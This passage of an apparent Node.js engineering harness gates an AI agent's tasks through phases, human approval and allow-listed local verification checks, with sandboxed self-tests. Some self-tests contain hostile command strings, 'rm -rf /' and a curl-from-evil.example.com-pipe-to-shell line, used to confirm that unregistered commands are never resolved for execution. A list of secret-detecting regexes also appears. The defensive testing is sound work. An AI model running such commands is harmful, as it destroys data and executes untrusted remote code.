    if (!check) return;
    if (!byId.has(checkId)) byId.set(checkId, { check, reasons: new Set() });
    byId.get(checkId).reasons.add(reason);
  };

  for (const rule of TASK_CLASS_RULES[task.taskClass] || []) {
    const check = findCheck(rule.checkId);
    if (!check) continue;
    if (rule.conditionalPathTest) {
      const matches = (changedPaths || []).some(rule.conditionalPathTest);
      if (!matches) {
        skipped.push({ checkId: check.id, reason: 'TASK_CLASS (conditional — no matching changed paths)' });
        continue;
      }
    }
    addSelected(check.id, 'TASK_CLASS');
  }

  for (const route of PATH_ROUTES) {
    if ((changedPaths || []).some(route.test)) {
      for (const checkId of checksForPathRoute(route.id)) {
        // Never auto-select a remote-read/local-mutation variant via path
        // routing alone — only the default static check for that surface.
        const check = findCheck(checkId);
        if (check.safety === SAFETY.LOCAL_STATIC || check.safety === SAFETY.LOCAL_LOGIC || check.safety === SAFETY.LOCAL_BUILD) {
          addSelected(checkId, 'PATH_MATCH');
        }
      }
    }
  }

  for (const declared of task.declaredVerification || []) {
    const check = resolveDeclaredCommand(declared);
    if (check) {
      addSelected(check.id, 'DECLARED');
    } else {
      unregistered.push({ declared });
    }
  }

  return { selected: [...byId.values()], skipped, unregistered };
}

function summarizeFailureTail(res) {
  const text = `${res.stdout || ''}\n${res.stderr || ''}`.trim();
  if (!text) return `exit ${res.status}`;
  const tail = text.slice(-300).replace(/\s+/g, ' ').trim();
  return tail || `exit ${res.status}`;
}

// Executes exactly one check. Only ever called for AUTO_EXECUTABLE_SAFETY
// checks, or a REMOTE_READ_ONLY check when the caller has already gated on
// --remote-read having been passed at invocation.
function executeCheck(check, changedPaths) {
  const startedAt = new Date().toISOString();
  if (check.synthetic || check.id === 'spec-only-scope-check') {
    const r = check.id === 'spec-only-scope-check' ? synthSpecOnlyScope(changedPaths) : check.synthetic();
    return { checkId: check.id, status: r.status, startedAt, finishedAt: new Date().toISOString(), exitCode: null, message: r.message };
  }
  const [bin, ...args] = check.command;
  const res = spawnMaybeWin(bin, args, { timeout: check.timeoutMs || 60000 });
  const finishedAt = new Date().toISOString();
  if (res.error) {
    return { checkId: check.id, status: 'FAIL', startedAt, finishedAt, exitCode: null, message: `spawn error: ${res.error.code || res.error.message}` };
  }
  const status = res.status === 0 ? 'PASS' : 'FAIL';
  return { checkId: check.id, status, startedAt, finishedAt, exitCode: res.status, message: status === 'PASS' ? 'ok' : summarizeFailureTail(res) };
}

// ---------------------------------------------------------------------
// Fact assembly — read-only. Nothing in this function, or anything it
// calls, writes to git or to disk.
// ---------------------------------------------------------------------

function computeFacts() {
  const head = getHead();
  const originMain = getOriginMain();
  const { ahead, behind } = getAheadBehind();
  const workingTree = getWorkingTree();

  const migrationFiles = getMigrationFiles();
  const ceiling = migrationFiles.length ? migrationFiles[migrationFiles.length - 1].number : null;

  const freeze = loadJSON('freeze.json', null);
  const migrationEvidenceDoc = loadJSON('migration-evidence.json', { entries: [] });
  const evidenceEntries = migrationEvidenceDoc.entries || [];
  const migrationCoverage = summarizeMigrationCoverage(ceiling, evidenceEntries);

  const decisions = loadJSONL('decisions.jsonl');
  const findings = loadJSONL('findings.jsonl');
  const protectedSurfacesDoc = loadJSON('protected-surfaces.json', { surfaces: [] });
  const protectedSurfaces = (protectedSurfacesDoc.surfaces || []).filter((s) => s.active);

  const verification = getVerificationInventory();
  const tools = getToolCapabilities();
  const handoff = checkHandoffStaleness(head);

  const activeTask = loadActiveTask();
  const activeTaskView = activeTask
    ? {
        ...activeTask,
        liveProtectedSurfaceHits: computeProtectedSurfaceHits(activeTask.expectedFiles),
        liveScopeCheck: computeScopeMismatch(activeTask.expectedFiles, workingTree.changedTrackedFiles),
      }
    : null;

  const warnings = [];
  if (workingTree.staged > 0 || workingTree.modified > 0) {
    warnings.push(`working tree has uncommitted tracked changes (staged=${workingTree.staged}, modified=${workingTree.modified})`);
  }
  if (workingTree.untracked > 0) {
    warnings.push(`${workingTree.untracked} untracked file(s) present — names listed below, contents not inspected`);
  }
  if (handoff.status === 'STALE') warnings.push(`HANDOFF_TO_CLAUDE.md is STALE (${handoff.detail})`);
  if (handoff.status === 'UNKNOWN') warnings.push(`HANDOFF_TO_CLAUDE.md staleness is UNKNOWN (${handoff.detail})`);
  for (const row of migrationCoverage) {
    if (row.status === 'UNKNOWN') warnings.push(`migrations ${row.range} have UNKNOWN live-apply evidence (file existence is not proof)`);
  }
  for (const t of tools) {
    if (t.status === 'MISSING') warnings.push(`tool missing: ${t.label}`);
    if (t.status === 'UNKNOWN') warnings.push(`tool status unknown: ${t.label} (${t.detail || 'no detail'})`);
  }
  if (!freeze) warnings.push('freeze.json missing or unreadable — freeze status cannot be confirmed');
  if (originMain === null) warnings.push('origin/main could not be resolved locally (fetch may be needed)');
  if (activeTaskView && activeTaskView.liveScopeCheck.outsideScope.length) {
    warnings.push(`active task has ${activeTaskView.liveScopeCheck.outsideScope.length} changed file(s) OUTSIDE_DECLARED_SCOPE`);
  }
  if (activeTaskView && activeTaskView.liveProtectedSurfaceHits.length) {
    warnings.push(`active task hits protected surface(s): ${activeTaskView.liveProtectedSurfaceHits.map((h) => h.surfaceId).join(', ')}`);
  }

  return {
    schemaVersion: SCHEMA_VERSION,
    generatedAt: new Date().toISOString(),
    code: {
      productionCodeBaseline: freeze ? freeze.productionCodeBaseline : null,
      head,
      originMain,
      ahead,
      behind,
      workingTree,
    },
    migrations: {
      ceiling,
      evidence: evidenceEntries,
      coverage: migrationCoverage,
    },
    freeze,
    decisions,
    findings,
    protectedSurfaces,
    activeTask: activeTaskView,
    verification,
    tools,
    handoff,
    warnings,
  };
}

// ---------------------------------------------------------------------
// Rendering
// ---------------------------------------------------------------------

function short(hash) {
  return hash ? hash.slice(0, 7) : 'UNKNOWN';
}

function renderHuman(f) {
  const lines = [];
  const hdr = (t) => {
    lines.push('');
    lines.push(`=== ${t} ===`);
  };

  lines.push(f.freeze && f.freeze.active ? '*** DEPLOYMENT FREEZE ACTIVE — DO NOT PUSH / MIGRATE / DEPLOY ***' : '(no active deployment freeze recorded)');

  hdr('CODE STATE');
  lines.push(`production baseline : ${short(f.code.productionCodeBaseline)}`);
  lines.push(`local HEAD          : ${short(f.code.head)}`);
  lines.push(`origin/main         : ${short(f.code.originMain)}`);
  lines.push(`ahead / behind      : ${f.code.ahead === null ? 'UNKNOWN' : f.code.ahead} ahead / ${f.code.behind === null ? 'UNKNOWN' : f.code.behind} behind`);
  lines.push(`working tree        : staged=${f.code.workingTree.staged} modified=${f.code.workingTree.modified} untracked=${f.code.workingTree.untracked}`);
  if (f.code.workingTree.untracked > 0) {
    for (const u of f.code.workingTree.untrackedFiles) lines.push(`  untracked: ${u}`);
  }

  hdr('DATABASE MIGRATION STATE');
  lines.push(`migration ceiling   : ${f.migrations.ceiling === null ? 'UNKNOWN (no migrations directory found)' : f.migrations.ceiling}`);
  for (const row of f.migrations.coverage) {
    lines.push(`  migrations ${row.range.padEnd(8)} : ${row.status}`);
  }
  if (!f.migrations.coverage.length) lines.push('  (no migration files found)');

  hdr('DEPLOYMENT POLICY');
  if (f.freeze) {
    lines.push(`freeze              : ${f.freeze.active ? 'ACTIVE' : 'INACTIVE'}`);
    lines.push(`reason              : ${f.freeze.reason}`);
  } else {
    lines.push('freeze              : UNKNOWN (freeze.json missing/unreadable)');
  }

  renderActiveTaskSection(lines, f.activeTask, f.code.workingTree);

  hdr('CURRENT ENGINEERING CONSTRAINTS');
  if (!f.decisions.length) lines.push('  (none recorded)');
  for (const d of f.decisions) lines.push(`  - [${d.status}] ${d.id}: ${d.summary}`);

  hdr('PROTECTED SURFACES');
  if (!f.protectedSurfaces.length) lines.push('  (none recorded)');
  for (const s of f.protectedSurfaces) lines.push(`  - ${s.id} (${(s.glob || []).join(', ')}): ${s.reason}`);

  hdr('AVAILABLE VERIFICATION');
  for (const v of f.verification.registered) lines.push(`  - ${v.command}`);
  for (const m of f.verification.manualOnly) lines.push(`  - node scripts/${m}  (manual only — not wired to an npm script)`);

  hdr('TOOL CAPABILITIES');
  for (const t of f.tools) lines.push(`  - ${t.label.padEnd(28)} ${t.status}${t.detail ? ' — ' + t.detail : ''}`);

  hdr('WARNINGS');
  if (!f.warnings.length) lines.push('  (none)');
  for (const w of f.warnings) lines.push(`  ! ${w}`);

  lines.push('');
  return lines.join('\n') + '\n';
}

// ---------------------------------------------------------------------
// Commands — status and self-test only. Nothing else is dispatched.
// ---------------------------------------------------------------------

const COMMANDS = ['status', 'self-test', 'task', 'verify'];

function cmdStatus(argv) {
  const facts = computeFacts();
  if (argv.includes('--json')) {
    process.stdout.write(JSON.stringify(facts, null, 2) + '\n');
  } else {
    process.stdout.write(renderHuman(facts));
  }
}

function cmdTask(argv) {
  const sub = argv[0];
  const rest = argv.slice(1);
  if (sub === 'new') return cmdTaskNew(rest);
  if (sub === 'plan') return cmdTaskPlan(rest);
  if (sub === 'phase') return cmdTaskPhase(rest);
  if (sub === 'approve') return cmdTaskApprove(rest);
  if (sub === 'block') return cmdTaskBlock(rest);
  if (sub === 'clear') return cmdTaskClear(rest);
  if (sub === 'status') {
    const lines = [];
    renderActiveTaskSection(lines, loadActiveTask(), getWorkingTree());
    process.stdout.write(lines.join('\n') + '\n');
    return;
  }
  process.stdout.write(`usage: node scripts/harness.cjs task <${TASK_SUBCOMMANDS.join('|')}>\n`);
  process.exitCode = 1;
}

function cmdVerify(rest) {
  const { flags } = parseFlags(rest);
  const task = loadActiveTask();
  if (!task) return taskError('no active task — verification requires an active task');

  const changedPaths = Array.from(new Set([
    ...(getWorkingTree().changedTrackedFiles || []),
    ...(task.expectedFiles || []),
  ]));

  const planMode = !!flags.plan;
  const onlyId = flags.only;
  const remoteReadAllowed = !!flags['remote-read'];

  if (!planMode && task.phase !== 'VERIFYING') {
    return taskError(`verify can only execute from phase VERIFYING (current: ${task.phase}) — run \`task phase VERIFYING\` first, or use --plan to inspect without running`);
  }

  let plan;
  if (onlyId) {
    const check = findCheck(onlyId);
    if (!check) return taskError(`unknown check id: ${onlyId} (see CHECK_REGISTRY ids in scripts/harness.cjs)`);
    plan = { selected: [{ check, reasons: new Set(['ONLY']) }], skipped: [], unregistered: [] };
  } else {
    plan = buildVerificationPlan(task, changedPaths);
  }

  for (const s of plan.skipped) process.stdout.write(`SKIP ${s.checkId} — ${s.reason}\n`);
  for (const u of plan.unregistered) process.stdout.write(`UNREGISTERED — MANUAL REVIEW REQUIRED: ${u.declared}\n`);

  if (planMode) {
    for (const { check, reasons } of plan.selected) {
      const wouldExecute = check.manualOnly
        ? false
        : AUTO_EXECUTABLE_SAFETY.includes(check.safety)
          ? true
          : check.safety === SAFETY.REMOTE_READ_ONLY ? remoteReadAllowed : false;
      process.stdout.write(`${wouldExecute ? 'WOULD RUN ' : 'MANUAL_REQUIRED'} ${check.id} [${check.safety}] — ${[...reasons].join(', ')} — ${check.description}\n`);
    }
    return;
  }

  const results = [];
  for (const s of plan.skipped) {
    results.push({ checkId: s.checkId, selectedBecause: ['TASK_CLASS'], status: 'SKIP', startedAt: null, finishedAt: null, exitCode: null, message: s.reason });
  }
  const pending = [];
  for (const { check, reasons } of plan.selected) {
    const selectedBecause = [...reasons];
    if (check.manualOnly) {
      results.push({ checkId: check.id, selectedBecause, status: 'MANUAL_REQUIRED', startedAt: null, finishedAt: null, exitCode: null, message: check.description });
      continue;
    }
    if (check.safety === SAFETY.REMOTE_READ_ONLY && !remoteReadAllowed) {
      results.push({ checkId: check.id, selectedBecause, status: 'MANUAL_REQUIRED', startedAt: null, finishedAt: null, exitCode: null, message: 'REMOTE READ AVAILABLE — explicit approval required (re-run with --remote-read to include)' });
      continue;
    }
    if (check.safety === SAFETY.LOCAL_TEST_MUTATION || check.safety === SAFETY.PRODUCTION_MUTATION) {
      results.push({ checkId: check.id, selectedBecause, status: 'MANUAL_REQUIRED', startedAt: null, finishedAt: null, exitCode: null, message: `${check.safety} is never auto-executed by the harness — run manually per its own documented safeguards` });
      continue;
    }
    if (check.safety === SAFETY.REMOTE_READ_ONLY) {
      process.stdout.write(`*** REMOTE READ APPROVED FOR THIS RUN — executing ${check.id} ***\n`);
    }
    pending.push({ check, selectedBecause });
  }
  for (const u of plan.unregistered) {
    results.push({ checkId: null, selectedBecause: ['DECLARED'], status: 'MANUAL_REQUIRED', startedAt: null, finishedAt: null, exitCode: null, message: `UNREGISTERED — MANUAL REVIEW REQUIRED: ${u.declared}` });
  }
  // Queue placeholders BEFORE running anything, so an interruption mid-run
  // leaves not-yet-reached checks visibly distinct (BLOCKED) from ones that
  // actually completed (PASS/FAIL).
  for (const { check, selectedBecause } of pending) {
    results.push({ checkId: check.id, selectedBecause, status: 'BLOCKED', startedAt: null, finishedAt: null, exitCode: null, message: 'queued — not yet started' });
  }

  task.verification = { lastRunAt: new Date().toISOString(), results };
  writeActiveTaskAtomic(touchTask(task));

  let anyFail = false;
  for (const { check, selectedBecause } of pending) {
    process.stdout.write(`RUNNING ${check.id}...\n`);
    const r = executeCheck(check, changedPaths);
    const idx = task.verification.results.findIndex((x) => x.checkId === check.id && x.status === 'BLOCKED');
    task.verification.results[idx] = { checkId: check.id, selectedBecause, status: r.status, startedAt: r.startedAt, finishedAt: r.finishedAt, exitCode: r.exitCode, message: r.message };
    writeActiveTaskAtomic(touchTask(task));
    process.stdout.write(`${r.status} ${check.id} — ${r.message}\n`);
    if (r.status === 'FAIL') anyFail = true;
  }

  if (anyFail) process.exitCode = 1;
}

function printUsage() {
  process.stdout.write('usage: node scripts/harness.cjs <status [--json] | self-test | task <subcommand> | verify [--plan|--only <id>|--remote-read]>\n');
}

// ---------------------------------------------------------------------
// self-test — proves the safety/correctness properties Harness 0 claims,
// by testing actual control-flow (the allowlist, the exposed command set,
// the migration-status resolution function) rather than by asserting the
// absence of arbitrary strings.
// ---------------------------------------------------------------------

const SECRET_PATTERNS = [/sk_live_/, /sk_test_/, /FLWSECK-/, /-----BEGIN/, /AIza[0-9A-Za-z_-]{10,}/, /gh[pousr]_[0-9A-Za-z]{20,}/];
const STATE_FILES = ['freeze.json', 'migration-evidence.json', 'decisions.jsonl', 'findings.jsonl', 'protected-surfaces.json'];

function cmdSelfTest() {
  const results = [];
  // Convention: fn() returns literal true to pass, or anything else (a
  // string detail, false) to fail — only an exact `true` counts as a pass,
  // so a truthy failure-detail string is never mistaken for success.
  const check = (name, fn) => {
    try {
      const ok = fn();
      results.push({ name, pass: ok === true, detail: ok === true ? '' : String(ok) });
    } catch (e) {
      results.push({ name, pass: false, detail: e.message });
    }
  };

  // --- command surface: exactly status + self-test + task + verify ---
  check('exposed command set is exactly {status, self-test, task, verify}', () => {
    const forbidden = ['commit', 'push', 'deploy', 'apply', 'migrate', 'db-push'];
    return COMMANDS.length === 4 && ['status', 'self-test', 'task', 'verify'].every((c) => COMMANDS.includes(c))
      && !forbidden.some((f) => COMMANDS.includes(f));
  });

  // --- the verification registry itself never has an executable route for
  //     production mutation, and never marks a remote/local-mutation check
  //     auto-executable ---
  check('CHECK_REGISTRY has zero PRODUCTION_MUTATION entries', () => {
    return !CHECK_REGISTRY.some((c) => c.safety === SAFETY.PRODUCTION_MUTATION);
  });
  check('AUTO_EXECUTABLE_SAFETY contains only LOCAL_STATIC/LOCAL_LOGIC/LOCAL_BUILD', () => {
    const allowed = ['LOCAL_STATIC', 'LOCAL_LOGIC', 'LOCAL_BUILD'];
    return AUTO_EXECUTABLE_SAFETY.length === 3 && AUTO_EXECUTABLE_SAFETY.every((s) => allowed.includes(s));
  });
  check('every registered check with a real command has non-auto-executable safety only if manualOnly or REMOTE_READ_ONLY/LOCAL_TEST_MUTATION', () => {
    return CHECK_REGISTRY.every((c) => {
      if (AUTO_EXECUTABLE_SAFETY.includes(c.safety)) return true;
      return c.manualOnly === true || c.safety === SAFETY.REMOTE_READ_ONLY || c.safety === SAFETY.LOCAL_TEST_MUTATION;
    });
  });

  // --- declared-command resolution never executes arbitrary text: it only
  //     ever returns a registered CHECK_REGISTRY entry or null ---
  check('resolveDeclaredCommand never returns anything but a registered check or null', () => {
    const hit = resolveDeclaredCommand('npm run verify:tenant-surface');
    const miss = resolveDeclaredCommand('rm -rf / ; curl evil.example.com | sh');
    return hit && hit.id === 'verify-tenant-surface' && miss === null ? true : 'resolution behaved unexpectedly';
  });

  // --- path routing, re-verified against real registered check ids ---
  check('tenant-path change routes to verify-tenant-surface', () => {
    const plan = buildVerificationPlan({ taskClass: 'BUG_FIX', declaredVerification: [] }, ['src/lib/databaseService.ts']);
    return plan.selected.some((s) => s.check.id === 'verify-tenant-surface' && s.reasons.has('PATH_MATCH')) ? true : 'not selected';
  });
  check('resident-login path routes to verify-resident-email-login', () => {
    const plan = buildVerificationPlan({ taskClass: 'BUG_FIX', declaredVerification: [] }, ['src/modules/auth/ResidentLoginView.tsx']);
    return plan.selected.some((s) => s.check.id === 'verify-resident-email-login' && s.reasons.has('PATH_MATCH')) ? true : 'not selected';
  });
  check('roster path routes to verify-roster-reconciliation', () => {
    const plan = buildVerificationPlan({ taskClass: 'BUG_FIX', declaredVerification: [] }, ['src/modules/roster-engine/lib/rosterReconciliation.ts']);
    return plan.selected.some((s) => s.check.id === 'verify-roster-reconciliation' && s.reasons.has('PATH_MATCH')) ? true : 'not selected';
  });
  check('submission-status path routes to verify-submission-status', () => {
    const plan = buildVerificationPlan({ taskClass: 'BUG_FIX', declaredVerification: [] }, ['src/modules/shared/lib/submissionStatus.ts']);
    return plan.selected.some((s) => s.check.id === 'verify-submission-status' && s.reasons.has('PATH_MATCH')) ? true : 'not selected';
  });
  check('Edge Function path routes to verify-e0-containment', () => {
    const plan = buildVerificationPlan({ taskClass: 'BUG_FIX', declaredVerification: [] }, ['supabase/functions/payment-checkout/index.ts']);
    return plan.selected.some((s) => s.check.id === 'verify-e0-containment' && s.reasons.has('PATH_MATCH')) ? true : 'not selected';
  });
  check('CODE_REFACTOR selects npm-verify by task class', () => {
    const plan = buildVerificationPlan({ taskClass: 'CODE_REFACTOR', declaredVerification: [] }, []);
    return plan.selected.some((s) => s.check.id === 'npm-verify' && s.reasons.has('TASK_CLASS')) ? true : 'not selected';
  });
  check('DOCUMENTATION_GOVERNANCE does not select npm-verify by default', () => {
    const plan = buildVerificationPlan({ taskClass: 'DOCUMENTATION_GOVERNANCE', declaredVerification: [] }, ['docs/SOMETHING.md']);
    return plan.selected.some((s) => s.check.id === 'npm-verify') ? 'npm-verify unexpectedly selected' : true;
  });
  check('SPECIFICATION_ONLY flags an unexpected src/ change', () => {
    const r = synthSpecOnlyScope(['src/App.tsx']);
    return r.status === 'FAIL' ? true : 'expected FAIL for a src/ change on a spec-only task';
  });
  check('SPECIFICATION_ONLY does not flag a docs-only change', () => {
    const r = synthSpecOnlyScope(['docs/SOMETHING.md']);
    return r.status === 'PASS' ? true : 'expected PASS for a docs-only change';
  });
  check('declared registered verification is included with reason DECLARED', () => {
    const plan = buildVerificationPlan({ taskClass: 'DOCUMENTATION_GOVERNANCE', declaredVerification: ['npm run verify:roster-reconciliation'] }, []);
    return plan.selected.some((s) => s.check.id === 'verify-roster-reconciliation' && s.reasons.has('DECLARED')) ? true : 'not included';
  });
  check('an unregistered declared command is captured, never resolved to a registry entry', () => {
    const plan = buildVerificationPlan({ taskClass: 'DOCUMENTATION_GOVERNANCE', declaredVerification: ['rm -rf /'] }, []);
    return plan.unregistered.some((u) => u.declared === 'rm -rf /') ? true : 'not captured as unregistered';
  });
  check('DATABASE_MIGRATION always selects migration-state-check', () => {
    const plan = buildVerificationPlan({ taskClass: 'DATABASE_MIGRATION', declaredVerification: [] }, ['supabase/migrations/67_something.sql']);
    return plan.selected.some((s) => s.check.id === 'migration-state-check') ? true : 'not selected';
  });
  check('DATABASE_MIGRATION skips npm-verify with a reason when no TS/source changed', () => {
    const plan = buildVerificationPlan({ taskClass: 'DATABASE_MIGRATION', declaredVerification: [] }, ['supabase/migrations/67_something.sql']);
    return plan.skipped.some((s) => s.checkId === 'npm-verify') ? true : 'not reported as skipped';
  });

  // --- task subcommand surface never contains a mutating-outside-state verb ---
  check('task subcommands contain no commit/push/deploy/apply verb', () => {
    const forbidden = ['commit', 'push', 'deploy', 'apply', 'migrate', 'db-push'];
    return TASK_SUBCOMMANDS.length === 7 && !forbidden.some((f) => TASK_SUBCOMMANDS.includes(f));
  });

  // --- APPROVED is only reachable via cmdTaskApprove, never the generic table ---
  check('ALLOWED_TRANSITIONS never lists APPROVED as a generic target', () => {
    const listsApproved = Object.values(ALLOWED_TRANSITIONS).some((targets) => targets.includes('APPROVED'));
    return !listsApproved;
  });

  // --- pure-logic unit checks, deterministic regardless of ambient repo state ---
  check('computeProtectedSurfaceHits detects a real intersection against committed protected-surfaces.json', () => {
    const hits = computeProtectedSurfaceHits(['src/modules/auth/LoginView.tsx']);
    return hits.some((h) => h.surfaceId === 'resident-login-email') ? true : 'no hit detected';
  });
  check('computeScopeMismatch classifies in-scope vs outside-declared-scope correctly', () => {
    const r = computeScopeMismatch(['src/modules/auth/**'], ['src/modules/auth/LoginView.tsx', 'src/modules/billing/Invoice.tsx']);
    return r.checked === true
      && r.inScope.includes('src/modules/auth/LoginView.tsx')
      && r.outsideScope.includes('src/modules/billing/Invoice.tsx')
      ? true : JSON.stringify(r);
  });

  // --- structural: the active-task writer is temp-file + rename, never a direct write to the live path ---
  check('writeActiveTaskAtomic uses a temp-file + renameSync strategy', () => {
    const full = fs.readFileSync(__filename, 'utf8');
    const fn = full.slice(full.indexOf('function writeActiveTaskAtomic'), full.indexOf('function deleteActiveTask'));
    return /renameSync\(/.test(fn) && /writeFileSync\(tmp,/.test(fn) ? true : 'missing temp+rename pattern';
  });

  // --- structural: none of the task command handlers ever spawn a process ---
  check('task command handlers never call spawnSync (fs/logic only, no git/push/deploy path)', () => {
    const full = fs.readFileSync(__filename, 'utf8');
    const fn = full.slice(full.indexOf('function cmdTaskNew'), full.indexOf('function renderActiveTaskSection'));
    return /spawnSync\(/.test(fn) ? 'spawnSync found in task handlers' : true;
  });

  // --- sandboxed black-box lifecycle tests. WORKSPC_ENG_DIR_OVERRIDE isolates
  //     every one of these from the real .workspc-engineering/active-task.json. ---
  {
    const realTaskFile = path.join(ENG_DIR, ACTIVE_TASK_FILE);
    const realTaskBefore = fs.existsSync(realTaskFile) ? fs.readFileSync(realTaskFile, 'utf8') : null;
    const sandboxes = [];
    const newSandbox = () => {
      const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'workspc-harness-selftest-'));
      fs.copyFileSync(path.join(ENG_DIR, 'protected-surfaces.json'), path.join(dir, 'protected-surfaces.json'));
      sandboxes.push(dir);
      return dir;
    };
    const runTask = (dir, args) => spawnSync(process.execPath, [__filename, 'task', ...args], {
      cwd: REPO_ROOT, encoding: 'utf8', timeout: 10000,
      env: { ...process.env, WORKSPC_ENG_DIR_OVERRIDE: dir },
    });
    // status invokes several tool --version checks (notably npx supabase,
    // which can take several seconds cold) — give it real headroom.
    const runStatusJson = (dir) => spawnSync(process.execPath, [__filename, 'status', '--json'], {
      cwd: REPO_ROOT, encoding: 'utf8', timeout: 20000,
      env: { ...process.env, WORKSPC_ENG_DIR_OVERRIDE: dir },
    });
    const readSandboxTask = (dir) => JSON.parse(fs.readFileSync(path.join(dir, ACTIVE_TASK_FILE), 'utf8'));
    const runVerify = (dir, args, timeoutMs) => spawnSync(process.execPath, [__filename, 'verify', ...args], {
      cwd: REPO_ROOT, encoding: 'utf8', timeout: timeoutMs || 15000,
      env: { ...process.env, WORKSPC_ENG_DIR_OVERRIDE: dir },
    });
    const advanceToVerifying = (dir, taskClass, expectedFiles) => {
      runTask(dir, ['new', '--title', 'verify router test', '--class', taskClass]);
      const planFile = path.join(dir, 'plan.json');
      fs.writeFileSync(planFile, JSON.stringify({ expectedFiles: expectedFiles || [] }));
      runTask(dir, ['plan', '--file', planFile]);
      runTask(dir, ['phase', 'AWAITING_HUMAN_REVIEW']);
      runTask(dir, ['approve', '--note', 'router self-test']);
      runTask(dir, ['phase', 'IMPLEMENTING']);
      runTask(dir, ['phase', 'VERIFYING']);
    };

    try {
      const sbBasic = newSandbox();
      check('new task can be created', () => {
        const r = runTask(sbBasic, ['new', '--title', 'sandbox task', '--class', 'BUG_FIX']);
        if (r.status !== 0) return `exit ${r.status}: ${r.stderr}`;
        const t = readSandboxTask(sbBasic);
        return t.phase === 'DISCOVERED' && t.taskClass === 'BUG_FIX' ? true : 'unexpected task state';
      });

      check('second active task is refused', () => {
        const r = runTask(sbBasic, ['new', '--title', 'second', '--class', 'BUG_FIX']);
        return r.status !== 0 && /already active/.test(r.stderr) ? true : `exit ${r.status}: ${r.stderr}`;
      });

      const sbInvalid = newSandbox();
      check('invalid task class is refused', () => {
        const r = runTask(sbInvalid, ['new', '--title', 'x', '--class', 'NOT_A_REAL_CLASS']);
        return r.status !== 0 ? true : 'accepted an invalid class';
      });

      check('invalid phase transition is refused', () => {
        runTask(sbInvalid, ['new', '--title', 'x', '--class', 'BUG_FIX']);
        const r = runTask(sbInvalid, ['phase', 'IMPLEMENTING']);
        return r.status !== 0 ? true : 'allowed DISCOVERED -> IMPLEMENTING directly';
      });

      check('AWAITING_HUMAN_REVIEW cannot silently become APPROVED via `task phase`', () => {
        runTask(sbInvalid, ['phase', 'PLAN_READY']);
        const planFile = path.join(sbInvalid, 'plan.json');
        fs.writeFileSync(planFile, JSON.stringify({ expectedFiles: ['scripts/unrelated.ts'] }));
        runTask(sbInvalid, ['plan', '--file', planFile]);
        runTask(sbInvalid, ['phase', 'AWAITING_HUMAN_REVIEW']);
        const r = runTask(sbInvalid, ['phase', 'APPROVED']);
        return r.status !== 0 && /task approve/.test(r.stderr) ? true : `exit ${r.status}: ${r.stderr}`;
      });

      check('approval requires explicit metadata (no --note is refused)', () => {
        const r = runTask(sbInvalid, ['approve']);
        return r.status !== 0 ? true : 'approved with no --note at all';
      });

      const sbProtected = newSandbox();
      check('protected-surface intersection is detected end-to-end via the CLI', () => {
        runTask(sbProtected, ['new', '--title', 'touches auth', '--class', 'BUG_FIX']);
        const planFile = path.join(sbProtected, 'plan.json');
        fs.writeFileSync(planFile, JSON.stringify({ expectedFiles: ['src/modules/auth/LoginView.tsx'] }));
        const r = runTask(sbProtected, ['plan', '--file', planFile]);
        const t = readSandboxTask(sbProtected);
        return r.status === 0 && t.protectedSurfaceHits.some((h) => h.surfaceId === 'resident-login-email') ? true : 'hit not recorded';
      });

      check('protected-surface task approval requires acknowledgement', () => {
        runTask(sbProtected, ['phase', 'AWAITING_HUMAN_REVIEW']);
        const withoutAck = runTask(sbProtected, ['approve', '--note', 'looks fine']);
        const blockedWithoutAck = withoutAck.status !== 0;
        const withAck = runTask(sbProtected, ['approve', '--note', 'looks fine, surface acknowledged', '--ack-protected-surfaces']);
        const passedWithAck = withAck.status === 0;
        return blockedWithoutAck && passedWithAck ? true : `withoutAck=${withoutAck.status} withAck=${withAck.status}: ${withAck.stderr}`;
      });

      check('fresh-agent `status --json` reconstructs the active task from disk alone', () => {
        const r = runStatusJson(sbProtected);
        const facts = JSON.parse(r.stdout);
        return facts.activeTask
          && facts.activeTask.phase === 'APPROVED'
          && facts.activeTask.expectedFiles.includes('src/modules/auth/LoginView.tsx')
          ? true : 'status --json did not reconstruct the sandboxed task';
      });

      check('`status --json` reports a well-shaped liveScopeCheck for the active task', () => {
        const r = runStatusJson(sbProtected);
        const facts = JSON.parse(r.stdout);
        const s = facts.activeTask && facts.activeTask.liveScopeCheck;
        return s && typeof s.checked === 'boolean' && Array.isArray(s.inScope) && Array.isArray(s.outsideScope)
          ? true : 'liveScopeCheck missing or malformed';
      });

      check('`status` does not mutate a sandboxed active-task.json', () => {
        const before = fs.readFileSync(path.join(sbProtected, ACTIVE_TASK_FILE), 'utf8');
        runStatusJson(sbProtected);
        const after = fs.readFileSync(path.join(sbProtected, ACTIVE_TASK_FILE), 'utf8');
        return before === after ? true : 'sandboxed active-task.json changed after a status call';
      });

      check('verify requires phase VERIFYING to execute (refuses from IMPLEMENTING)', () => {
        const d = newSandbox();
        runTask(d, ['new', '--title', 'phase gate', '--class', 'BUG_FIX']);
        runTask(d, ['phase', 'PLAN_READY']);
        const r = runVerify(d, []);
        return r.status !== 0 && /VERIFYING/.test(r.stderr) ? true : `exit ${r.status}: ${r.stderr}`;
      });

      check('`verify --plan` is read-only and requires no particular phase', () => {
        const d = newSandbox();
        runTask(d, ['new', '--title', 'plan mode', '--class', 'CODE_REFACTOR']);
        const before = fs.readFileSync(path.join(d, ACTIVE_TASK_FILE), 'utf8');
        const r = runVerify(d, ['--plan']);
        const after = fs.readFileSync(path.join(d, ACTIVE_TASK_FILE), 'utf8');
        return r.status === 0 && /npm-verify/.test(r.stdout) && before === after ? true : `exit ${r.status} stdout=${r.stdout} changed=${before !== after}`;
      });

      const sbPass = newSandbox();
      check('PASS is recorded for an executed check', () => {
        advanceToVerifying(sbPass, 'BUG_FIX', []);
        const r = runVerify(sbPass, ['--only', 'migration-state-check']);
        const t = readSandboxTask(sbPass);
        const result = t.verification.results.find((x) => x.checkId === 'migration-state-check');
        return r.status === 0 && result && result.status === 'PASS' ? true : `exit ${r.status}: ${JSON.stringify(result)}`;
      });

      const sbFail = newSandbox();
      check('FAIL is recorded and returns a non-zero harness exit code', () => {
        advanceToVerifying(sbFail, 'SPECIFICATION_ONLY', ['src/App.tsx']);
        const r = runVerify(sbFail, ['--only', 'spec-only-scope-check']);
        const t = readSandboxTask(sbFail);
        const result = t.verification.results.find((x) => x.checkId === 'spec-only-scope-check');
        return r.status !== 0 && result && result.status === 'FAIL' ? true : `exit ${r.status}: ${JSON.stringify(result)}`;
      });

      const sbSkipManual = newSandbox();
      check('SKIP and MANUAL_REQUIRED results retain their reason', () => {
